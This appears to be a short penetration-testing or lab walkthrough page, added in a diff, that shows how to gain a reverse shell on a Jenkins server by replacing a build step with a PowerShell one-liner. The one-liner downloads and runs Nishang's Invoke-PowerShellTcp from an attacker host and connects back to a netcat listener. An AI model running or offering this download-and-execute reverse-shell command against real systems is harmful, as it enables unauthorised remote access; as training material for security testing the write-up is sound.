@@ -1,0 +1,33 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Gaining Access</title>
+</head><body>With the same step but with different command &nbsp;we can produce reverse shell.<br/>
+<br/>
+On reverse item we've created click configure<br/>
+<img src="image.png" width="700" height="339" /><br/>
+<br/>
+Change ping command with:<br/>
+powershell iex (New-Object Net.WebClient).DownloadString('http://your-http-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port, then click save.<br/>
+<img src="image 2.png" /><br/>
+<br/>
+Setup HTTP server on nishang folder. You can get it here https://github.com/samratashok/nishang<br/>
+<img src="image 3.png" /><br/>
+<br/>
+Setup netcat to receive reverse shell<br/>
+<img src="image 4.png" /><br/>
+<br/>
+On the jenkins platform, click build now like a previous step.<br/>
+<img src="image 5.png" width="600" height="310" /><br/>
+<br/>
+We got the reverse shell!<br/>
+<br/>
+<img src="image 6.png" width="700" height="321" /><br/>
+<br/>
+<img src="image 7.png" /><br/>
+<br/>
+<br/>
+<br/>
+<br/>
+</body></html>
